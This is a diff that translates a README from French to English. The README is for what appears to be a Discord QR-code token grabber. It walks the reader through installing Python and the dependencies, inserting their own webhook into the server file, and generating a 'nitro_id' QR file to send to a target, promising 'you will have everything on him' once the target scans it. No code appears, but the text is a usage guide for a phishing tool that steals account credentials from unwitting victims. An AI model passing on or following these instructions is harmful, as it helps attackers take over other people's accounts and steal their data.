@@ -1,21 +1,21 @@
 
 <b> Prerequis </b>
-Il est très important d'installe python 3.7.9 voici le lien : 
+It is very important to install python 3.7.9 here is the link:
 https://www.python.org/ftp/python/3.7.9/python-3.7.9-amd64.exe
 
 <b> Installation<b/>
-Une fois que vous aurez installé python 3.7.9 vous 
-devez lancé un cmd dans le fichier et tapé 
+Once you have installed python 3.7.9 you
+must run a cmd in the file and type
 * python -m pip install -r requirements.txt
-Si ça ne marche pas essayé ceci :
+If it doesn't work try this:
 * pip install -r requirements.txt
 
-Puis vous ouvrez le fichier "server" et vous allez à la ligne 232 / 230 et vous mettez votre webhook
-une fois ceci fait vous pouvez lancé le fichier "start_multiple" et tapé puis vous faite entrez
-ensuite vous aurez dans le dossier "out" un fichier nommé "nitro_id" etc vous l'envoyée à la personne et puis si il le scan
-vous aurez tout sur lui !
+Then you open the "server" file and you go to line 232/230 and you put your webhook
+once this is done you can launch the file "start_multiple" and type then you made enter
+then you will have in the "out" folder a file named "nitro_id" etc you sent it to the person and then if he scans it
+you will have everything on him!
 
-Crédits
+Credits
 https://youtube.com/c/KASav3348
 https://discord.gg/MxZEGJug5z
 
